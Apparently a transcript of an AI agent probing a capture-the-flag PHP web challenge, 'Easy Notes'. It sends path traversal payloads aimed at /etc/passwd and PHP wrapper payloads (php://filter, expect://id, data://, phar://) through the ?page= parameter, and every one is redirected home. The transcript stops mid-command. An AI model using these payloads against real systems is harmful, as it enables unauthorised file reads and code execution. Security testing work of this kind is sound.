@@ -1,0 +1,3296 @@
+Reading additional input from stdin...
+OpenAI Codex v0.146.0
+--------
+workdir: /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+model: gpt-5.5
+provider: openai
+approval: never
+sandbox: danger-full-access
+reasoning effort: xhigh
+reasoning summaries: none
+session id: 019fb7be-820a-7533-8738-cc66a4a6f9d8
+--------
+user
+Target: http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com:80 . Workdir: /home/stw/ctf-agent/challenges/manual_web_920544e8040f . Focus only on ?page= parameter and route/source disclosure. Test LFI/path traversal/php wrappers/common pages safely. Do not brute force passwords. Save concise findings. Mark FEASIBLE only if you find source disclosure, file read, auth bypass, or flag path.
+
+协作隔离规则：你是只读试探分支。不要修改 board.md、progress.md、guidance.md、dead_ends.md，也不要创建或修改主线文件；只允许在完成时写入指定的结果文件。
+
+---
+完成后将结果写入 /home/stw/ctf-agent/challenges/manual_web_920544e8040f/branch_result_branch_001.md，格式:
+## Branch Result
+direction: page-lfi-route-probe
+subagent_id: branch_001
+status: FEASIBLE | INFEASIBLE
+### 发现
+(列出关键发现)
+### 命令和结果
+(关键命令及其输出)
+### 结论
+(可行/不可行 + 建议)
+warning: `--dangerously-bypass-hook-trust` is enabled. Enabled hooks may run without review for this invocation.
+warning: `--dangerously-bypass-hook-trust` is enabled. Enabled hooks may run without review for this invocation.
+codex
+I’ll keep this branch isolated: no progress/board edits, only the required result file at the end. I’m starting with a small baseline of the target and then will vary only the `page` parameter and nearby route/source disclosure paths.
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 40ms:
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:12 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=d542a6f63472df93619a3bf0078c7ce1; path=/
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.9
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    <title>Easy Notes</title>
+  </head>
+  <body>
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-light bg-light">
+        <a class="navbar-brand" href="/">Easy Notes</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarDropdown" aria-controls="navbarDropdown" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarDropdown">
+          <ul class="navbar-nav mr-auto">
+            <li class="nav-item"><a class="nav-link" href="/">Home</a></li>
+                        <li class="nav-item"><a class="nav-link disabled" href="?page=flag">Get flag</a></li>
+          </ul>
+          <ul class="navbar-nav">
+                        <li class="nav-item"><a class="nav-link" href="?page=login">Log in</a></li>
+                      </ul>
+        </div>
+      </nav>
+    </div>
+    <main class="container">
+      <section class="jumbotron">
+        <h1>Easy Notes</h1>
+        <p class="lead">Easy Notes is a note-taking service. You can write notes and export them as a .zip or .tar! </p>
+        <p class="lead">Since this is an experimental service, there might be a lot of bugs… If you find bugs, please do not abuse them!</p>
+                <a href="?page=login" class="btn btn-primary">Log in</a>
+              </section>
+    </main>
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
+  </body>
+</html>
+hook: PostToolUse
+hook: PostToolUse Completed
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=index'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 0ms:
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:12 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=e229651e47d1e4015ad7d12f55ebc168; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+hook: PostToolUse
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=home'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 0ms:
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:12 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=1e3c52a7b8774ae6a1de1289b5d7454b; path=/
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.9
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    <title>Easy Notes</title>
+  </head>
+  <body>
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-light bg-light">
+        <a class="navbar-brand" href="/">Easy Notes</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarDropdown" aria-controls="navbarDropdown" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarDropdown">
+          <ul class="navbar-nav mr-auto">
+            <li class="nav-item"><a class="nav-link" href="/">Home</a></li>
+                        <li class="nav-item"><a class="nav-link disabled" href="?page=flag">Get flag</a></li>
+          </ul>
+          <ul class="navbar-nav">
+                        <li class="nav-item"><a class="nav-link" href="?page=login">Log in</a></li>
+                      </ul>
+        </div>
+      </nav>
+    </div>
+    <main class="container">
+      <section class="jumbotron">
+        <h1>Easy Notes</h1>
+        <p class="lead">Easy Notes is a note-taking service. You can write notes and export them as a .zip or .tar! </p>
+        <p class="lead">Since this is an experimental service, there might be a lot of bugs… If you find bugs, please do not abuse them!</p>
+                <a href="?page=login" class="btn btn-primary">Log in</a>
+              </section>
+    </main>
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
+  </body>
+</html>
+hook: PostToolUse
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+codex
+The app is PHP 7.3.9 and routes through `?page=...`; `?page=index` redirects to `home`, and the navbar exposes `home`, `login`, and a disabled `flag` route. I’m checking those named routes first so the traversal/wrapper tests have a baseline response to compare against.
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=login'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 0ms:
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:24 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=4a26458afb2ab8ee42336a47714af0f6; path=/
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.9
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    <title>Easy Notes</title>
+  </head>
+  <body>
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-light bg-light">
+        <a class="navbar-brand" href="/">Easy Notes</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarDropdown" aria-controls="navbarDropdown" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarDropdown">
+          <ul class="navbar-nav mr-auto">
+            <li class="nav-item"><a class="nav-link" href="/">Home</a></li>
+                        <li class="nav-item"><a class="nav-link disabled" href="?page=flag">Get flag</a></li>
+          </ul>
+          <ul class="navbar-nav">
+                        <li class="nav-item"><a class="nav-link" href="?page=login">Log in</a></li>
+                      </ul>
+        </div>
+      </nav>
+    </div>
+    <main class="container">
+      <section>
+        <h2>Log in</h2>
+        <form action="login.php" method="POST">
+          <div class="form-group">
+            <label for="title">Username</label>
+            <input type="text" class="form-control" id="user" name="user" placeholder="e.g. irizaki_mei" pattern="^[0-9A-Za-z_-]{4,64}$">
+            <small class="form-text text-muted">format: <code>/^[0-9A-Za-z_-]{4,64}$/</code></small>
+          </div>
+          <button type="submit" class="btn btn-primary">Log in</button>
+        </form>
+      </section>
+    </main>
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
+  </body>
+</html>
+hook: PostToolUse
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=register'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 0ms:
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:24 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=ada7bf9f3b030680bb6f4c55420afc59; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+hook: PostToolUse
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=flag'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 0ms:
+HTTP/1.1 200 OK
+Transfer-Encoding: chunked
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:24 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=4fac0f27360b641db36dd0641c3ad5a7; path=/
+Vary: Accept-Encoding
+Vary: Accept-Encoding
+X-Powered-By: PHP/7.3.9
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
+    <title>Easy Notes</title>
+  </head>
+  <body>
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-light bg-light">
+        <a class="navbar-brand" href="/">Easy Notes</a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarDropdown" aria-controls="navbarDropdown" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarDropdown">
+          <ul class="navbar-nav mr-auto">
+            <li class="nav-item"><a class="nav-link" href="/">Home</a></li>
+                        <li class="nav-item"><a class="nav-link disabled" href="?page=flag">Get flag</a></li>
+          </ul>
+          <ul class="navbar-nav">
+                        <li class="nav-item"><a class="nav-link" href="?page=login">Log in</a></li>
+                      </ul>
+        </div>
+      </nav>
+    </div>
+    <main class="container">
+      <section>
+        <h2>Get flag</h2>
+        <p>
+          You are not an admin :(        </p>
+      </section>
+    </main>
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
+  </body>
+</html>
+exec
+/bin/bash -lc "curl -i -sS --max-time 10 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=notes'" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+hook: PostToolUse
+ succeeded in 0ms:
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:24 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=eb13a92552fb8ceba2a24fe2bc41ef88; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+hook: PostToolUse
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+hook: PostToolUse Completed
+codex
+`?page=flag` is reachable unauthenticated but only says “You are not an admin :(”. Unknown page names currently redirect to `/?page=home`, so I’m moving to traversal/wrapper payloads and checking whether any variant breaks out of that redirect behavior.
+exec
+/bin/bash -lc "for p in '../etc/passwd' '../../etc/passwd' '../../../etc/passwd' '../../../../etc/passwd' '../../../../../etc/passwd' '../../../../../../etc/passwd' '/etc/passwd' '..%2F..%2F..%2F..%2Fetc%2Fpasswd' '..%252F..%252F..%252F..%252Fetc%252Fpasswd' '....//....//....//etc/passwd' '..%2f..%2f..%2f..%2fetc%2fpasswd'; do printf '\\n=== %s ===\\n' \""'$p"; curl -sS -i --max-time 8 --path-as-is "http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=$p" | sed -n '"'1,18p'; done" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 2187ms:
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:41 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=a632c629c5f49b461ba564e4576396a1; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ../../../etc/passwd ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:41 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=beeb2eaac948f0b8d7c70feeff4874b6; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ../../../../etc/passwd ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:41 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=093c28b4f86422e5cbd7caa045870577; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ../../../../../etc/passwd ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:42 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=992fdac846e8ec69d056262c1f125537; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ../../../../../../etc/passwd ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:42 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=4f90952ba63a3cdac05dfe50a09b96fe; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== /etc/passwd ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:42 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=70b5a814fd3a0f966f678828eaad9a6c; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ..%2F..%2F..%2F..%2Fetc%2Fpasswd ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:42 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=1eb99b7e3d7f4837179cb5260480bfee; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ..%252F..%252F..%252F..%252Fetc%252Fpasswd ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:43 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=4ca80b8431b8a03586c346c31ef44a72; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ....//....//....//etc/passwd ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:43 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=259b123a08c082055b75d465439ee455; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== ..%2f..%2f..%2f..%2fetc%2fpasswd ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:43 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=66ce99534226086db1088134b91e1b34; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Traversal variants are consistently rejected with a 302 back to `home`, including encoded and doubled-slash forms. I’m now checking wrapper-style values and a small fixed set of likely route names; this is route discovery, not password guessing.
+exec
+/bin/bash -lc "for p in 'php://filter/convert.base64-encode/resource=index' 'php://filter/convert.base64-encode/resource=home' 'php://filter/convert.base64-encode/resource=flag' 'php://filter/read=convert.base64-encode/resource=index.php' 'php:%2f%2ffilter%2fconvert.base64-encode%2fresource=index' 'data://text/plain,hello' 'expect://id' 'zip://test.zip%23a' 'phar://test.phar/a'; do printf '\\n=== %s ===\\n' \""'$p"; curl -sS -i --max-time 8 --path-as-is "http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com/?page=$p" | sed -n '"'1,22p'; done" in /home/stw/ctf-agent/challenges/manual_web_920544e8040f
+ succeeded in 963ms:
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:56 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=1c0f64913f4c3aa71eb6e86b29f252f2; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== php://filter/convert.base64-encode/resource=flag ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:56 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=dd27f5197753f37cfda35cb732bd55e6; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== php://filter/read=convert.base64-encode/resource=index.php ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:56 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=9c094e60de390114d5b5e498046b435b; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== php:%2f%2ffilter%2fconvert.base64-encode%2fresource=index ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:56 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=62829050aded2f807c6f4f2f19b5fa8b; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== data://text/plain,hello ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:56 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=3b721c74f84a6206a111e09bedfef9b5; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== expect://id ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:56 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=adb4f4f4b2cf5bc10187f86cba5a688c; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== zip://test.zip%23a ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:57 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=deab622db0eb9c339bf524192402e530; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+=== phar://test.phar/a ===
+HTTP/1.1 302 Found
+Cache-Control: no-store, no-cache, must-revalidate
+Cache-Control: no-cache
+Connection: keep-alive
+Content-Type: text/html; charset=UTF-8
+Date: Fri, 31 Jul 2026 10:36:57 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Keep-Alive: timeout=4
+Location: /?page=home
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Server: openresty
+Set-Cookie: PHPSESSID=ebfeaa9e2473ccffdefefa5a6aeeb200; path=/
+X-Powered-By: PHP/7.3.9
+Content-Length: 0
+
+
+hook: PostToolUse
+hook: PostToolUse Completed
+codex
+Wrapper payloads are also rejected before inclusion: each one returns the same 302-to-home pattern, which points to validation or a fixed route map around `page`. I’m doing one narrow common-route pass to see whether hidden page values disclose source, routes, or a flag path.
+exec
